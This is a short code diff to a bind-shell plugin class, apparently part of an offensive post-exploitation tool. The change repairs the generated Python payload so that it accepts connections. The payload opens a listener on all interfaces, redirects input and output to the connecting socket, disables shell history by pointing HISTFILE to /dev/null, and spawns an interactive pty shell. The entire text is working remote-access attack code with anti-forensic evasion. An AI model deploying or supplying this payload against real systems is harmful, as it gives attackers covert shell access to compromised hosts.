@@ -117,7 +117,7 @@ class BindTCP(plugin.BindShell):
         if self.args.exec == "pty":
             self.shell = "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
             self.shell += f"s.bind((\"0.0.0.0\",{self.args.port}));"
-            self.shell += "s.listen(1);(rem,addr)=s.recvfrom(1024);os.dup2(rem.fileno(),0);"
+            self.shell += "s.listen(1);(rem,addr)=s.accept();os.dup2(rem.fileno(),0);"
             self.shell += "os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);"
             self.shell += f"os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"{self.args.shell}\");s.close()"
         else:
